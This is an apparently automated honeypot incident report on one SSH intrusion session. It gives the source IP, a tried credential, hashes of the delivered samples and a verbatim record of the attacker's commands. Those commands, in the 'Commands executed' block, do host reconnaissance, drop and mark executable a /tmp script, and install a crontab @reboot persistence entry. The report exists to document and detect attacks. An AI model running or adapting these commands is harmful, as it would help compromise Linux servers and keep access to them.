# Incident: 112.146.101.75

| | |
|---|---|
| Source | `112.146.101.75` |
| Country | South Korea |
| First seen | 2026-09-10 08:30:48 UTC |
| Last seen | 2026-09-10 08:31:26 UTC |
| Sessions | 1 |
| Events | 27 |
| Services abused | ssh |
| Ports | 22 |
| Classification | malware loader, persistence / reverse shell |

## Techniques

- `CWE-506` persistence via scheduled task

## Credentials attempted

1 attempts across 1 distinct pairs.

| username | password | count |
|---|---|---|
| `ansible` | `w+pD#Xz-_vkqCI5` | 1 |

## Commands executed

Verbatim attacker input. Lyrebird's responses are deliberately not published.

```
cd /dev/shm \|\| cd /tmp \|\| cd /var/run \|\| cd /mnt \|\| cd /root \|\| cd / && cat > astats
uname -a
sh -c 'for d in /dev/shm /tmp /var/run /mnt /root /; do cd "$d" 2>/dev/null && pwd && break; done'
cat /proc/cpuinfo \| grep processor \| wc -l
cd "/tmp" && if [ ! -f "w.sh" ]; then cat > "w.sh" && chmod +x w.sh; fi
CRON="$(crontab -l 2>/dev/null \|\| true)" echo "$CRON" \| grep -F '/tmp/w.sh "astats" "netai" "kstats" "ssh 2 ranges"' >/dev/null 2>&1 \|\| \   printf '%s\n%s\n' "@reboot  /tmp/w.sh "…
ps -eo pid,pcpu,comm --sort=-pcpu \| head -n 10
ps aux \| grep astats \| grep -v grep \| wc -l
```

## Samples delivered

| sha256 | size | type |
|---|---|---|
| [`bc36e729c6463e7120677c0d59b9d793401b320520201043048577d4d94cee28`](../../../samples/bc36e729c6463e7120677c0d59b9d793401b320520201043048577d4d94cee28.zip) | 1,421 B | script (#!/usr/bin/env bash) |
| [`62a4b82cadbf1da27c616c27dfa81a668439b36bd691e8f967104b24a7653996`](../../../samples/62a4b82cadbf1da27c616c27dfa81a668439b36bd691e8f967104b24a7653996.zip) | 1,048,576 B | ELF 64-bit executable (Linux/Unix) |

Archives are zip-encrypted with the password `infected` — the convention for malware distribution. Handle in an isolated environment.

## Detections

- Host Reconnaissance Commands (4)
- Download-and-Execute Payload Chain (1)
- Persistence Mechanism (1)

---

Collected by a Lyrebird honeypot operated by [birdo.uk](https://birdo.uk). Generated 2026-09-12 00:08 UTC.

Services are emulated; no real host was compromised. Attacker input is reproduced verbatim and is hostile by definition — do not execute anything recorded here.
